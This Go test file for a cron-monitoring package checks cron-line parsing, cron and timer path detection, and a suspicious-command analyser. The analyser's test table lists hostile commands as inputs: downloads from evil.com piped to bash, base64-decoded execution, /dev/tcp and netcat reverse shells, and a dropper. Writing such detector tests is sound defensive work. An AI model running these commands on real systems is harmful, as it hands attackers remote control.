package cronmon

import (
	"testing"

	"github.com/rs/zerolog"
)

func TestParseCronLine(t *testing.T) {
	tests := []struct {
		name        string
		line        string
		defaultUser string
		wantSched   string
		wantUser    string
		wantCmd     string
		wantOK      bool
	}{
		{
			name:        "standard_5_field",
			line:        "*/5 * * * * root /usr/bin/backup.sh",
			defaultUser: "root",
			wantSched:   "*/5 * * * *",
			wantUser:    "root",
			wantCmd:     "root /usr/bin/backup.sh",
			wantOK:      true,
		},
		{
			name:        "at_reboot",
			line:        "@reboot /usr/local/bin/startup.sh",
			defaultUser: "root",
			wantSched:   "@reboot",
			wantUser:    "root",
			wantCmd:     "/usr/local/bin/startup.sh",
			wantOK:      true,
		},
		{
			name:        "at_daily",
			line:        "@daily /usr/bin/cleanup.sh --all",
			defaultUser: "user1",
			wantSched:   "@daily",
			wantUser:    "user1",
			wantCmd:     "/usr/bin/cleanup.sh --all",
			wantOK:      true,
		},
		{
			name:        "too_few_fields",
			line:        "*/5 * * *",
			defaultUser: "root",
			wantOK:      false,
		},
		{
			name:        "at_reboot_no_cmd",
			line:        "@reboot",
			defaultUser: "root",
			wantOK:      false,
		},
		{
			name:        "per_user_crontab",
			line:        "0 3 * * * /home/bob/nightly.sh",
			defaultUser: "bob",
			wantSched:   "0 3 * * *",
			wantUser:    "bob",
			wantCmd:     "/home/bob/nightly.sh",
			wantOK:      true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			sched, user, cmd, ok := parseCronLine(tt.line, tt.defaultUser)
			if ok != tt.wantOK {
				t.Errorf("ok: got %v, want %v", ok, tt.wantOK)
				return
			}
			if !ok {
				return
			}
			if sched != tt.wantSched {
				t.Errorf("schedule: got %q, want %q", sched, tt.wantSched)
			}
			if user != tt.wantUser {
				t.Errorf("user: got %q, want %q", user, tt.wantUser)
			}
			if cmd != tt.wantCmd {
				t.Errorf("command: got %q, want %q", cmd, tt.wantCmd)
			}
		})
	}
}

func TestAnalyzeSuspicious(t *testing.T) {
	tests := []struct {
		name     string
		command  string
		wantSusp bool
		wantTags []string
	}{
		{
			name:     "wget_download",
			command:  "wget http://evil.com/malware.sh -O /tmp/m.sh",
			wantSusp: true,
			wantTags: []string{"downloads"},
		},
		{
			name:     "curl_download",
			command:  "curl -s http://evil.com/payload | bash",
			wantSusp: true,
			wantTags: []string{"downloads"},
		},
		{
			name:     "base64_encoded",
			command:  "echo ZWNobyBoYWNrZWQ= | base64 -d | bash",
			wantSusp: true,
			wantTags: []string{"encoded"},
		},
		{
			name:     "eval_command",
			command:  "eval $(echo payload)",
			wantSusp: true,
			wantTags: []string{"encoded"},
		},
		{
			name:     "reverse_shell_devtcp",
			command:  "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
			wantSusp: true,
			wantTags: []string{"reverse-shell"},
		},
		{
			name:     "nc_reverse_shell",
			command:  "nc -e /bin/bash 10.0.0.1 4444",
			wantSusp: true,
			wantTags: []string{"reverse-shell"},
		},
		{
			name:     "dropper_chmod",
			command:  "chmod +x /tmp/payload && /tmp/payload",
			wantSusp: true,
			wantTags: []string{"dropper"},
		},
		{
			name:     "multiple_suspicious_patterns",
			command:  "curl http://evil.com/x.sh | bash -i >& /dev/tcp/10.0.0.1/4444",
			wantSusp: true,
			wantTags: []string{"downloads", "reverse-shell"},
		},
		{
			name:     "benign_command",
			command:  "/usr/bin/logrotate /etc/logrotate.conf",
			wantSusp: false,
			wantTags: nil,
		},
		{
			name:     "empty_command",
			command:  "",
			wantSusp: false,
			wantTags: nil,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			suspicious, tags := analyzeSuspicious(tt.command)
			if suspicious != tt.wantSusp {
				t.Errorf("suspicious: got %v, want %v", suspicious, tt.wantSusp)
			}
			if len(tags) != len(tt.wantTags) {
				t.Errorf("tags: got %v, want %v", tags, tt.wantTags)
				return
			}
			for i, tag := range tags {
				if tag != tt.wantTags[i] {
					t.Errorf("tag[%d]: got %q, want %q", i, tag, tt.wantTags[i])
				}
			}
		})
	}
}

func TestIsCronPath(t *testing.T) {
	m := New(DefaultConfig(), nil, zerolog.Nop())

	tests := []struct {
		path string
		want bool
	}{
		{"/etc/crontab", true},
		{"/etc/cron.d/myfile", true},
		{"/etc/cron.daily/logrotate", true},
		{"/etc/cron.hourly/something", true},
		{"/etc/cron.weekly/something", true},
		{"/etc/cron.monthly/something", true},
		{"/var/spool/cron/root", true},
		{"/var/spool/cron/crontabs/bob", true},
		{"/etc/systemd/system/backup.timer", true},
		{"/etc/systemd/user/cleanup.timer", true},
		{"/etc/passwd", false},
		{"/tmp/crontab", false},
		{"/home/user/.bashrc", false},
	}

	for _, tt := range tests {
		t.Run(tt.path, func(t *testing.T) {
			got := m.isCronPath(tt.path)
			if got != tt.want {
				t.Errorf("isCronPath(%q): got %v, want %v", tt.path, got, tt.want)
			}
		})
	}
}

func TestIsTimerFile(t *testing.T) {
	tests := []struct {
		path string
		want bool
	}{
		{"/etc/systemd/system/backup.timer", true},
		{"/etc/systemd/user/cleanup.timer", true},
		{"/etc/systemd/system/backup.service", false},
		{"/etc/cron.d/myfile", false},
		{"/tmp/test.timer", false},
	}

	for _, tt := range tests {
		t.Run(tt.path, func(t *testing.T) {
			got := isTimerFile(tt.path)
			if got != tt.want {
				t.Errorf("isTimerFile(%q): got %v, want %v", tt.path, got, tt.want)
			}
		})
	}
}

func TestInferCronUser(t *testing.T) {
	tests := []struct {
		path string
		want string
	}{
		{"/var/spool/cron/crontabs/bob", "bob"},
		{"/var/spool/cron/crontabs/root", "root"},
		{"/var/spool/cron/alice", "alice"},
		{"/etc/crontab", "root"},
		{"/etc/cron.d/mycron", "root"},
	}

	for _, tt := range tests {
		t.Run(tt.path, func(t *testing.T) {
			got := inferCronUser(tt.path)
			if got != tt.want {
				t.Errorf("inferCronUser(%q): got %q, want %q", tt.path, got, tt.want)
			}
		})
	}
}
